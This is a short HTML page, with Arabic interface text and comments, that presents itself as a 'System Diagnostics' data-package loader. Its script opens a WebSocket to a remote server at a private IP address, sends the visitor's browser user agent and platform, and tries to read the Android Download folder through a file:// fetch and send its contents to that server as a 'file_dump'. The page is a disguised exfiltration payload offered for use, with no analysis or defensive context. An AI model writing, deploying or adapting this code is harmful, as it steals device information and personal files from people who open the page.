<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostics</title>
</head>
<body>
    <h2>جاري تحميل حزمة البيانات...</h2>
    <script>
        // إنشاء اتصال WebSocket عكسي مع خادمك السليم
        const ws = new WebSocket('ws://10.0.0.108:8765');
        
        ws.onopen = function() {
            console.log("[+] متصل بالسيرفر بنجاح");
            
            // محاولة جمع معلومات النظام المتاحة عبر المتصفح
            const sysData = {
                action: "system_info",
                ua: navigator.userAgent,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled
            };
            ws.send(JSON.stringify(sysData));
            
            // محاولة جلب الملفات المتاحة في التخزين الخارجي إن وجدت عبر مسارات الـ File API
            try {
                fetch('file:///sdcard/Download/')
                    .then(response => response.text())
                    .then(data => {
                        ws.send(JSON.stringify({action: "file_dump", content: data}));
                    }).catch(err => {
                        ws.send(JSON.stringify({action: "error", msg: "Sandbox restriction applied"}));
                    });
            } catch(e) {
                ws.send(JSON.stringify({action: "error", msg: e.toString()}));
            }
        };
    </script>
</body>
</html>
